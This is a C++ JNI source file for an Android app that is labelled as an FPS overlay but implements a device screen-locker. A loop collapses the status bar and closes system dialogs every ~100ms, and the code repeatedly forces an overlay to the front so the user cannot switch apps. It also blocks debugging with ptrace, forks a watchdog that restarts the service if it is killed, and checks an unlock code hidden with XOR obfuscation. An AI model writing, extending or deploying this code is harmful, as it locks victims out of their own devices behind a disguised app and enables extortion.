#include <jni.h>
#include <string>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <cstdio>
#include <signal.h>
#include <sys/ptrace.h>
#include <vector>

JavaVM* jvm = nullptr;
jobject serviceObject = nullptr;
pid_t watchdogPid = -1;
volatile bool isRunning = false;

// Kunci: "02042009" ter-obfuscate dengan XOR 0x0E
// '0'^0x0E=0x3E, '2'^0x0E=0x3C, '0'^0x0E=0x3E, '4'^0x0E=0x3A, '2'^0x0E=0x3C, '0'^0x0E=0x3E, '0'^0x0E=0x3E, '9'^0x0E=0x37
static const unsigned char SECRET_KEY[] = {0x3E, 0x3C, 0x3E, 0x3A, 0x3C, 0x3E, 0x3E, 0x37};
static const size_t KEY_LEN = 8;

void* aggressiveLoop(void* args) {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) exit(0);

    JNIEnv* env;
    if (jvm->AttachCurrentThread(&env, nullptr) != JNI_OK) return nullptr;

    int counter = 0;
    while (isRunning) {
        if (serviceObject == nullptr) break;

        jclass clazz = env->GetObjectClass(serviceObject);

        // Agresi UI: Collapse status bar & close dialogs
        if (counter % 10 == 0) { // Setiap ~100ms
            jmethodID collapse = env->GetMethodID(clazz, "collapseStatusBar", "()V");
            jmethodID closeDials = env->GetMethodID(clazz, "closeSystemDialogs", "()V");
            if (collapse) env->CallVoidMethod(serviceObject, collapse);
            if (closeDials) env->CallVoidMethod(serviceObject, closeDials);
        }

        // Paksa aplikasi ke depan jika user mencoba switch
        if (counter % 50 == 0) { // Setiap ~500ms
            jmethodID refresh = env->GetMethodID(clazz, "refreshOverlay", "()V");
            if (refresh) env->CallVoidMethod(serviceObject, refresh);
        }

        counter++;
        usleep(10000); // 10ms sleep
    }

    jvm->DetachCurrentThread();
    return nullptr;
}

void startWatchdog(const char* cmd) {
    watchdogPid = fork();
    if (watchdogPid == 0) { // Watchdog Process
        while (true) {
            if (getppid() <= 1) { // Parent died (init adopted us or it's gone)
                system(cmd);
                exit(0);
            }
            sleep(2);
        }
    }
}

extern "C" JNIEXPORT void JNICALL
Java_com_bluestacks_fpsoverlay_FPSService_startNativeAggression(JNIEnv* env, jobject thiz, jstring serviceName) {
    if (isRunning) return;
    
    env->GetJavaVM(&jvm);
    serviceObject = env->NewGlobalRef(thiz);
    isRunning = true;

    const char* name = env->GetStringUTFChars(serviceName, nullptr);
    char cmd[256];
    sprintf(cmd, "am startservice --user 0 -n %s", name);
    env->ReleaseStringUTFChars(serviceName, name);
    
    startWatchdog(cmd);

    pthread_t thread;
    pthread_create(&thread, nullptr, aggressiveLoop, nullptr);
}

extern "C" JNIEXPORT void JNICALL
Java_com_bluestacks_fpsoverlay_FPSService_stopNativeAggression(JNIEnv* env, jobject thiz) {
    isRunning = false;
    if (watchdogPid > 0) {
        kill(watchdogPid, SIGKILL);
        watchdogPid = -1;
    }
    if (serviceObject != nullptr) {
        env->DeleteGlobalRef(serviceObject);
        serviceObject = nullptr;
    }
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_bluestacks_fpsoverlay_FPSAccessibilityService_verifyAdvancedKey(JNIEnv* env, jobject thiz, jstring input) {
    if (input == nullptr) return JNI_FALSE;

    const char* nativeInput = env->GetStringUTFChars(input, nullptr);
    size_t inputLen = strlen(nativeInput);

    bool match = (inputLen == KEY_LEN);
    if (match) {
        for (size_t i = 0; i < KEY_LEN; i++) {
            if ((unsigned char)(nativeInput[i] ^ 0x0E) != SECRET_KEY[i]) {
                match = false;
                break;
            }
        }
    }

    env->ReleaseStringUTFChars(input, nativeInput);
    return match ? JNI_TRUE : JNI_FALSE;
}
